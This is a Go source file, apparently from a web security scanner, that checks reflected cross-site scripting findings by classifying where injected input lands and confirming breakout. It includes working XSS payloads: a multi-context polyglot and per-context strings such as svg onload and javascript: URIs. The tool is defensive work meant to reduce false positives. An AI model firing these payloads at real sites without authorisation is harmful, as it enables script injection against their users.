package scanner

import (
	"context"
	"fmt"
	"net/url"
	"strings"
)

// Reflected-XSS context analysis + verification (Phase 4/5). The single biggest
// XSS false-positive source is "input was reflected ⇒ XSS". This layer decides,
// deterministically and WITHOUT a browser, whether a reflection is actually
// EXECUTABLE: it injects a marker followed by the key breakout characters
// ('"<>) and checks (a) WHERE the marker landed (HTML text / quoted attr /
// unquoted attr / JS string / JSON / URL / CSS) and (b) whether those breakout
// characters survived UNENCODED in that context.
//
//   reflected & encoded            → REJECTED  (safe output encoding)
//   reflected raw in exec context  → VERIFIED  (records context + surviving chars)
//   reflected but ambiguous / none → INCONCLUSIVE

// XSS reflection contexts.
const (
	CtxNone         = "none"
	CtxHTMLText     = "html_text"
	CtxQuotedAttr   = "quoted_attribute"
	CtxUnquotedAttr = "unquoted_attribute"
	CtxJSString     = "js_string"
	CtxJSExpr       = "js_expression"
	CtxJSON         = "json"
	CtxURL          = "url"
	CtxCSS          = "css"
	CtxComment      = "html_comment"
	CtxRCDATA       = "rcdata" // inside <textarea>/<title>/<noscript>… raw-text
)

// xssProbe is a unique marker followed by the four key breakout characters.
const xssMarker = "rcnx9k7"
const xssProbe = xssMarker + `'"<>`

// ReflectionAnalysis is the result of analysing where/how a probe reflected.
type ReflectionAnalysis struct {
	Reflected  bool
	Context    string
	Surviving  string // which of ' " < > survived UNENCODED
	Executable bool
	Encoded    bool
	Quote      byte   // the attribute quote char (' or ") when in an attribute, else 0
	CloseTag   string // for CtxRCDATA: the close tag needed to break out (e.g. </textarea>)
}

// rcdataElements are raw-text/RCDATA elements whose content is NOT parsed as
// markup: a reflection inside one is inert until its close tag breaks out. Search
// terms echoed into <title> and <textarea> are a very common real XSS sink.
var rcdataElements = []string{"textarea", "title", "noscript", "xmp", "noembed", "iframe"}

// AnalyzeReflection inspects a response body for the injected probe. Input is
// frequently echoed in MORE THAN ONE place — e.g. HTML-encoded in the page title
// but raw inside an attribute, or safe in one <div> and executable in a <script>.
// Analysing only the first occurrence (the historical behaviour) silently missed
// the executable one. This scans EVERY occurrence and returns the strongest
// verdict (an executable reflection beats a raw-but-unproven one beats an encoded
// one), so a single exploitable sink anywhere is enough.
func AnalyzeReflection(body string) ReflectionAnalysis {
	best := ReflectionAnalysis{Context: CtxNone}
	for off := 0; ; {
		rel := strings.Index(body[off:], xssMarker)
		if rel < 0 {
			break
		}
		idx := off + rel
		off = idx + len(xssMarker)
		a := analyzeReflectionAt(body, idx)
		if reflectionStronger(a, best) {
			best = a
		}
		if best.Executable {
			break // can't do better than a provably-executable reflection
		}
	}
	return best
}

// reflectionRank orders reflections by exploit value: executable > raw (breakout
// chars survived but context unproven) > merely reflected/encoded.
func reflectionRank(a ReflectionAnalysis) int {
	switch {
	case a.Executable:
		return 3
	case a.Reflected && a.Surviving != "" && !a.Encoded:
		return 2
	case a.Reflected:
		return 1
	default:
		return 0
	}
}

func reflectionStronger(a, b ReflectionAnalysis) bool { return reflectionRank(a) > reflectionRank(b) }

// analyzeReflectionAt analyses ONE occurrence of the marker at body[idx:].
func analyzeReflectionAt(body string, idx int) ReflectionAnalysis {
	a := ReflectionAnalysis{Context: CtxNone, Reflected: true}

	// What followed the marker? Widen the window to 16 bytes so HTML-entity
	// encodings (&quot; is 6 bytes; two entities already exceed 8) are seen.
	after := body[idx+len(xssMarker):]
	end := len(after)
	if end > 16 {
		end = 16
	}
	tail := after[:end]
	for _, ch := range []string{`<`, `>`, `"`, `'`} {
		if strings.Contains(tail, ch) {
			a.Surviving += ch
		}
	}
	// Encoded if the breakout chars come back as HTML entities (named, decimal or
	// hex) — the hallmark of safe output encoding.
	if strings.Contains(tail, "&lt;") || strings.Contains(tail, "&gt;") ||
		strings.Contains(tail, "&quot;") || strings.Contains(tail, "&#39;") ||
		strings.Contains(tail, "&#x") || strings.Contains(tail, "&#3") ||
		strings.Contains(tail, "&apos;") {
		a.Encoded = true
	}

	a.Context, a.Quote, a.CloseTag = classifyContext(body[:idx])

	// Executable = it landed somewhere markup/script-relevant AND the breakout
	// character that context needs survived raw. Every VERIFIED verdict below is a
	// browserless-provable breakout (the exact byte that escapes the context).
	switch a.Context {
	case CtxHTMLText:
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	case CtxQuotedAttr, CtxURL:
		// Break the ACTUAL opening quote (single or double) → close the tag → new
		// element/event. Checking a fixed '"' missed every single-quoted attribute.
		q := string(rune(a.Quote))
		if a.Quote == 0 {
			q = `"`
		}
		a.Executable = strings.Contains(a.Surviving, q)
	case CtxUnquotedAttr:
		a.Executable = true // unquoted attr: a space + event handler already suffices
	case CtxJSString:
		a.Executable = strings.Contains(a.Surviving, "'") || strings.Contains(a.Surviving, `"`) ||
			(strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">"))
	case CtxJSExpr:
		a.Executable = true
	case CtxCSS:
		// Inside <style>: closing it (</style>) needs < and > to survive, then a
		// fresh element executes. A raw style value alone no longer executes.
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	case CtxComment, CtxRCDATA:
		// Break out of the comment (-->) or raw-text element (</textarea>) into HTML
		// text; both require the angle brackets to survive UNENCODED to form the
		// breakout sequence and a fresh element.
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	}
	if a.Encoded {
		a.Executable = false
	}
	return a
}

// nosniffNote appends a mention of the nosniff header when present, so the
// rejection reason names both facts a triager needs (declared type + nosniff).
func nosniffNote(nosniff bool) string {
	if nosniff {
		return " with X-Content-Type-Options: nosniff"
	}
	return ""
}

// urlAttrs are attributes whose value is a URL: a reflection at the SCHEME of one
// of these is a javascript:-URI sink, and breaking its quote is an HTML breakout.
var urlAttrs = map[string]bool{
	"href": true, "src": true, "action": true, "formaction": true,
	"data": true, "poster": true, "background": true, "cite": true,
	"longdesc": true, "xlink:href": true, "srcset": true, "ping": true,
}

// classifyContext determines the context from the text PRECEDING the marker, the
// (attribute) quote char, and (for RCDATA) the close tag needed to break out.
func classifyContext(before string) (string, byte, string) {
	low := strings.ToLower(before)
	// inside an HTML comment? <!-- … [here] with no --> after the last <!--.
	if lc := strings.LastIndex(before, "<!--"); lc >= 0 && lc > strings.LastIndex(before, "-->") {
		return CtxComment, 0, ""
	}
	// inside a <script> block?
	lastScript := strings.LastIndex(low, "<script")
	lastScriptEnd := strings.LastIndex(low, "</script")
	if lastScript > lastScriptEnd {
		// inside JS. string if an odd number of unescaped quotes precede us.
		seg := before[lastScript:]
		if inQuotedString(seg) {
			return CtxJSString, 0, ""
		}
		return CtxJSExpr, 0, ""
	}
	// inside a <style> block?
	lastStyle := strings.LastIndex(low, "<style")
	lastStyleEnd := strings.LastIndex(low, "</style")
	if lastStyle > lastStyleEnd {
		return CtxCSS, 0, ""
	}
	// inside a raw-text/RCDATA element (<textarea>/<title>/…)? Innermost wins.
	if ctxName, closeTag, ok := rcdataContext(before, low); ok {
		_ = ctxName
		return CtxRCDATA, 0, closeTag
	}
	// inside an open tag (attribute area)? find last '<' vs last '>'
	lt := strings.LastIndex(before, "<")
	gt := strings.LastIndex(before, ">")
	if lt > gt {
		tag := before[lt:]
		// attribute value quoting: look for = just before us
		eq := strings.LastIndex(tag, "=")
		if eq >= 0 {
			name := attrNameBeforeEq(tag, eq)
			rest := strings.TrimLeft(tag[eq+1:], " ")
			var quote byte
			if strings.HasPrefix(rest, `"`) {
				quote = '"'
			} else if strings.HasPrefix(rest, "'") {
				quote = '\''
			}
			if urlAttrs[name] {
				return CtxURL, quote, "" // src/href/… value → URL sink
			}
			if quote != 0 {
				return CtxQuotedAttr, quote, ""
			}
			return CtxUnquotedAttr, 0, ""
		}
		return CtxUnquotedAttr, 0, ""
	}
	return CtxHTMLText, 0, ""
}

// rcdataContext reports whether the marker sits inside the raw-text content of an
// RCDATA/RAWTEXT element (not its open-tag attributes), and returns the close tag
// that breaks out. It picks the INNERMOST such element still open before the marker.
func rcdataContext(before, low string) (ctxName, closeTag string, ok bool) {
	bestOpen := -1
	for _, el := range rcdataElements {
		o := strings.LastIndex(low, "<"+el)
		if o < 0 || o <= bestOpen {
			continue
		}
		// must be past the element's own open-tag '>' (i.e. in its content),
		// and not already closed by a matching </el> after that.
		tagEnd := strings.IndexByte(low[o:], '>')
		if tagEnd < 0 {
			continue // still inside the open tag's attributes → not RCDATA content
		}
		contentStart := o + tagEnd + 1
		if strings.Contains(low[contentStart:], "</"+el) {
			continue // element already closed before the marker
		}
		bestOpen = o
		ctxName, closeTag, ok = el, "</"+el+">", true
	}
	return ctxName, closeTag, ok
}

// attrNameBeforeEq extracts the (lower-cased) attribute name immediately before
// the '=' at position eq within an open-tag fragment.
func attrNameBeforeEq(tag string, eq int) string {
	i := eq - 1
	for i >= 0 && (tag[i] == ' ' || tag[i] == '\t' || tag[i] == '\n' || tag[i] == '\r') {
		i--
	}
	end := i + 1
	for i >= 0 {
		c := tag[i]
		if c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '<' || c == '"' || c == '\'' {
			break
		}
		i--
	}
	return strings.ToLower(tag[i+1 : end])
}

// inQuotedString reports whether the segment ends inside an open JS string.
func inQuotedString(seg string) bool {
	var q byte
	for i := 0; i < len(seg); i++ {
		c := seg[i]
		if c == '\\' {
			i++
			continue
		}
		if q == 0 && (c == '\'' || c == '"' || c == '`') {
			q = c
		} else if c == q {
			q = 0
		}
	}
	return q != 0
}

// XSSContextVerifier proves reflected XSS by context analysis. Reuses Replay
// (shared client + optional identity headers) — no second HTTP engine.
type XSSContextVerifier struct {
	identity *Identity // optional (authenticated reflection)
}

func NewXSSContextVerifier(id *Identity) *XSSContextVerifier {
	return &XSSContextVerifier{identity: id}
}

func (v *XSSContextVerifier) Name() string { return "xss-context" }

func (v *XSSContextVerifier) CanVerify(c VulnerabilityCandidate) bool {
	return c.Type == "xss" && (c.Subtype == "" || c.Subtype == "reflected")
}

// Verify first runs the fast, deterministic browserless analysis; if that does
// not already PROVE the XSS, it escalates to a real headless browser (when one is
// available) that renders the page and confirms actual payload execution. The
// browser pass is what catches modern client-rendered / SPA reflections and
// JS-context execution the browserless parser cannot prove.
func (v *XSSContextVerifier) Verify(ctx context.Context, c VulnerabilityCandidate) VerifyResult {
	res := v.verifyBrowserless(ctx, c)
	if res.Verdict == VerifyVerified {
		return res
	}
	// Escalate everything the browserless pass did not prove — including the
	// "not reflected in the raw HTML" case, which is exactly how a client-rendered
	// SPA looks (the reflection is injected into the DOM by JS after load).
	if b := getXSSBrowser(); b != nil {
		if pl, ok := b.Confirm(ctx, c.URL, c.Parameter); ok {
			return VerifyResult{
				Verdict:    VerifyVerified,
				Confidence: 99,
				Method:     "xss-browser",
				Evidence:   "reflected XSS PROVEN in a real headless browser: the injected payload EXECUTED (a JS dialog carrying our nonce fired) after the page rendered. This confirms execution on the live/rendered page (works for client-rendered & SPA apps). Executable payload: " + pl,
			}
		}
	}
	return res
}

func (v *XSSContextVerifier) verifyBrowserless(ctx context.Context, c VulnerabilityCandidate) VerifyResult {
	probeURL, ok := injectProbe(c.URL, c.Parameter)
	if !ok {
		return VerifyResult{Verdict: VerifyInconclusive, Reason: "could not place probe in parameter", Method: "xss-context"}
	}
	r := Replay(ctx, ReplaySpec{Method: "GET", URL: probeURL}, v.identity)
	// WAF/block-page gate: if the probe was met by a WAF block/challenge page, any
	// "reflection" is the WAF echoing our payload into its own block template, not
	// the app rendering it — it never executes. Reject so a dalfox/nuclei reflection
	// hit against a blocked endpoint is not promoted to a false finding.
	if looksLikeBlockPage(r.Status, r.Response.Body) {
		return VerifyResult{Verdict: VerifyRejected, Confidence: 0, Method: "xss-context",
			Reason: fmt.Sprintf("request was answered by a WAF/edge block or challenge page (HTTP %d) — the reflected value is echoed by the WAF, not rendered by the app, so it does not execute", r.Status)}
	}
	a := AnalyzeReflection(r.Response.Body)
	// Content-Type gate: a reflected payload only executes when the browser renders
	// the response as an HTML document. Input echoed into application/json (or any
	// declared non-HTML type) — even with the breakout chars '"<> surviving raw —
	// is inert on direct navigation, and X-Content-Type-Options: nosniff makes that
	// non-negotiable. This is THE dominant reflected-XSS false positive: an API
	// endpoint reflecting a parameter into its JSON body (e.g. ably.com's
	// clientId → {"clientId":"…"} with nosniff). Without this gate the body-only
	// analysis mistakes a JSON reflection for HTML-text context (JSON does not
	// encode < or >) and wrongly promotes it to VERIFIED.
	htmlSink := browserRendersAsHTML(r.CT, r.Response.Body, r.Response.NoSniff)
	switch {
	case !a.Reflected:
		return VerifyResult{Verdict: VerifyInconclusive, Reason: "probe not reflected at this parameter", Method: "xss-context"}
	case a.Encoded && !a.Executable:
		return VerifyResult{Verdict: VerifyRejected, Confidence: 0,
			Reason: "input is reflected but safely HTML-encoded in " + a.Context + " context — not executable", Method: "xss-context"}
	case !a.Executable:
		return VerifyResult{Verdict: VerifyInconclusive,
			Reason: "reflected in " + a.Context + " but breakout characters did not survive raw — cannot prove execution", Method: "xss-context"}
	case !htmlSink:
		return VerifyResult{Verdict: VerifyRejected, Confidence: 0,
			Reason: "input is reflected with breakout chars surviving, but the response is " + ctLabel(r.CT) +
				nosniffNote(r.Response.NoSniff) + " — a browser will not render it as HTML, so it does not execute (reflected XSS requires an HTML-rendered response)",
			Method: "xss-context"}
	}

	// EXECUTION CONFIRM — the char-survival analysis above is necessary but NOT
	// sufficient: surviving '<' '>' can still be neutralised by the surrounding
	// markup, so "reflected" is not "executable". This second stage injects a
	// BENIGN marker ELEMENT with the context-appropriate breakout and requires it
	// to materialise as a GENUINE start tag in an HTML-rendered response — the same
	// browserless, deterministic proof the active DAST engine uses. Only THEN is
	// the XSS verified. This is what kills the dominant reflected-XSS false
	// positive (a nuclei/dalfox reflection hit that never actually forms a tag): a
	// payload that does not become a live element is rejected, so a real finding
	// means the marker element truly sits in the page and would execute.
	payload, needle, confirmable := dastConfirm(a)
	if !confirmable {
		payload, needle, confirmable = jsScriptBreakout(a)
	}
	if !confirmable {
		return VerifyResult{Verdict: VerifyInconclusive, Method: "xss-context",
			Reason: "executable-looking reflection in " + a.Context + " context, but no deterministic browserless breakout applies (needs runtime/DOM proof)"}
	}
	baseR := Replay(ctx, ReplaySpec{Method: "GET", URL: injectParam(c.URL, c.Parameter, dastNonce)}, v.identity)
	confR := Replay(ctx, ReplaySpec{Method: "GET", URL: injectParam(c.URL, c.Parameter, payload)}, v.identity)
	if browserRendersAsHTML(confR.CT, confR.Response.Body, confR.Response.NoSniff) &&
		htmlTagInjected(confR.Response.Body, dastElement) &&
		!strings.Contains(baseR.Response.Body, needle) {
		ev := "reflected XSS PROVEN in " + a.Context + " context: a benign marker element injected via the context breakout materialised as a LIVE HTML start tag in the rendered response (execution-equivalent, absent from baseline). Executable payload: " +
			contextPayload(a.Context) + " | context-agnostic polyglot: " + xssPolyglot
		return VerifyResult{Verdict: VerifyVerified, Confidence: 95, Evidence: ev, Method: "xss-context"}
	}
	return VerifyResult{Verdict: VerifyRejected, Confidence: 0, Method: "xss-context",
		Reason: "input is reflected in " + a.Context + " context but the injected marker element did NOT form a live HTML tag (neutralised by the surrounding markup / re-encoded on the confirm request) — not executable, so not a real XSS"}
}

// xssPolyglot is a single context-breaking payload (adapted from 0xsobky /
// Gareth Heyes' well-known polyglots) that fires across HTML-text, quoted/unquoted
// attribute, comment, and several JS-string contexts at once. Reported alongside
// the context-specific exploit so a triager has one string that works even when
// the exact surrounding context is uncertain.
const xssPolyglot = `jaVasCript:/*-/*` + "`" + `/*` + "`" + `/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e`

// contextPayload returns an example executable payload per context (for evidence).
// These are real, minimal exploits — not fixed to alert(1): they use
// alert(document.domain) so a triager instantly sees WHICH origin executed.
func contextPayload(ctxName string) string {
	switch ctxName {
	case CtxHTMLText:
		// <svg onload> is shorter than <script> and fires without a network fetch;
		// <img src=x onerror> is the classic fallback where svg is filtered.
		return `<svg onload=alert(document.domain)>`
	case CtxQuotedAttr:
		// Break the quote, close the tag, then a fresh auto-firing element.
		return `"><svg onload=alert(document.domain)>`
	case CtxUnquotedAttr:
		// No quote to break: a leading space starts a new attribute; autofocus makes
		// onfocus fire with no user interaction. Works where onmouseover would not.
		return ` autofocus onfocus=alert(document.domain) x=`
	case CtxJSString:
		// Close the string, terminate the statement, run code, comment out the rest.
		// If < and > survive, </script><svg onload=…> is the more reliable variant.
		return `';alert(document.domain)//`
	case CtxJSExpr:
		return `alert(document.domain)`
	case CtxURL:
		// href/src sink: javascript: URIs execute on click/navigation.
		return `javascript:alert(document.domain)`
	case CtxCSS:
		// Modern browsers dropped expression()/-moz-binding, so a raw <style> value
		// rarely executes on its own — break out of the style block entirely.
		return `</style><svg onload=alert(document.domain)>`
	case CtxComment:
		// Close the comment, then a fresh auto-firing element.
		return `--><svg onload=alert(document.domain)>`
	case CtxRCDATA:
		// Close the raw-text element (title/textarea/…), then a fresh element.
		return `</textarea></title><svg onload=alert(document.domain)>`
	default:
		return `<svg onload=alert(document.domain)>`
	}
}

// injectProbe places the xssProbe into a query parameter of rawURL using the
// shared minimal-escaping primitive (injectParam) — the same builder the active
// DAST engine uses. url.Values.Encode() would re-encode every SIBLING parameter
// (double-encoding any already-percent-encoded value) and reorder the query;
// injectParam touches only the target parameter, so the probe reaches the server
// byte-for-byte and no unrelated value is corrupted.
func injectProbe(rawURL, param string) (string, bool) {
	if param == "" {
		return "", false
	}
	if _, err := url.Parse(rawURL); err != nil {
		return "", false
	}
	return injectParam(rawURL, param, xssProbe), true
}
